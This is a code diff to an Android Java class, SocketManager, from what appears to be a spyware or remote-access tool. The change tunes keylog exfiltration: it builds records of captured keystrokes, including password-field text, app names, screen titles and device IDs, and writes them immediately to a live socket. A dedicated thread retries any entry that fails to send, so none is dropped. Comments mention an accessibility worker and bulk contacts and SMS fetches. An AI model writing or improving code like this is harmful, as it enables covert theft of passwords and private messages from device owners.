@@ -131,6 +131,17 @@ public class SocketManager {
         new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
     );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
+    // Dedicated keylog dispatcher, used only when the inline fast path cannot
+    // write (live channel down or mid-reconnect). Kept separate from
+    // `executor` so a bulk fetch can never sit in front of a captured
+    // keystroke, and from `liveExecutor` whose thread is blocked in readLine().
+    // Overflow runs on the calling thread instead of dropping an entry.
+    private final ExecutorService keylogExecutor = new java.util.concurrent.ThreadPoolExecutor(
+        1, 1, 30L, TimeUnit.SECONDS,
+        new java.util.concurrent.LinkedBlockingQueue<>(500),
+        r -> { Thread t = new Thread(r, "SocketMgr-keylog"); t.setDaemon(true); return t; },
+        new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
+    );
     private ScheduledFuture<?>             heartbeatFuture;
 
     // ── Multi-channel sockets ─────────────────────────────────────────────
@@ -3780,30 +3791,67 @@ public class SocketManager {
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                 String timestamp, boolean isPassword, String fieldType,
                                 String screenTitle) {
-        // IMPORTANT: Use the general cached executor, NOT liveExecutor.
-        // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
-        // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
-        executor.execute(() -> {
-            try {
-                JSONObject entry = new JSONObject();
-                entry.put("packageName", packageName);
-                entry.put("appName", appName != null ? appName : packageName);
-                entry.put("text", text);
-                entry.put("eventType", eventType);
-                entry.put("timestamp", timestamp);
-                entry.put("isPassword", isPassword);
-                entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
-                entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                if (screenTitle != null && !screenTitle.isEmpty()) {
-                    entry.put("screenTitle", screenTitle);
-                }
-                // Only send if live channel is connected (device is online).
-                // If offline, drop silently — do NOT queue as a command.
-                sendLiveOnly("keylog:entry", entry);
-            } catch (Exception e) {
-                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
+        // The JSON envelope is built here, on the accessibility worker, so the
+        // queued task is nothing but a socket write. Deferring the build to an
+        // executor thread added a queue hop before the bytes even existed.
+        final JSONObject entry;
+        try {
+            entry = new JSONObject();
+            entry.put("packageName", packageName);
+            entry.put("appName", appName != null ? appName : packageName);
+            entry.put("text", text);
+            entry.put("eventType", eventType);
+            entry.put("timestamp", timestamp);
+            entry.put("isPassword", isPassword);
+            entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
+            entry.put("deviceId", DeviceInfo.getDeviceId(context));
+            if (screenTitle != null && !screenTitle.isEmpty()) {
+                entry.put("screenTitle", screenTitle);
             }
-        });
+        } catch (Exception e) {
+            Log.e(TAG, "pushKeylogEntry build error: " + e.getMessage());
+            return;
+        }
+
+        // Fast path: the live channel is already up, so write straight to the
+        // socket from this thread. That is a single print+flush — no executor
+        // hand-off, no queueing behind a contacts/SMS/keylogs fetch.
+        //
+        // IMPORTANT: must not use liveExecutor — its single thread is
+        // permanently blocked in liveChannelLoop's readLine().
+        if (liveConnected && liveOut != null && sendLiveNow("keylog:entry", entry)) {
+            return;
+        }
+        // Offline or the write failed: fall back to the dedicated keylog thread,
+        // which re-checks the channel and drops into the reconnect backlog.
+        try {
+            keylogExecutor.execute(() -> sendLiveOnly("keylog:entry", entry));
+        } catch (Exception e) {
+            Log.e(TAG, "pushKeylogEntry dispatch error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Write one event to the live socket without the queue-on-disconnect
+     * behaviour of {@link #sendLiveOnly}. Caller must have already observed
+     * {@link #liveConnected}. Returns false if the write failed so the caller
+     * can retry through the backlog path.
+     */
+    private boolean sendLiveNow(String event, JSONObject data) {
+        try {
+            synchronized (liveLock) {
+                if (!liveConnected || liveOut == null) return false;
+                JSONObject msg = new JSONObject();
+                msg.put("event", event);
+                msg.put("data", data);
+                liveOut.print(msg.toString() + "\n");
+                liveOut.flush();
+                return !liveOut.checkError();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "sendLiveNow [" + event + "] error: " + e.getMessage());
+            return false;
+        }
     }
 
     /** Scan a read_screen result for password fields and push them as keylog entries. */
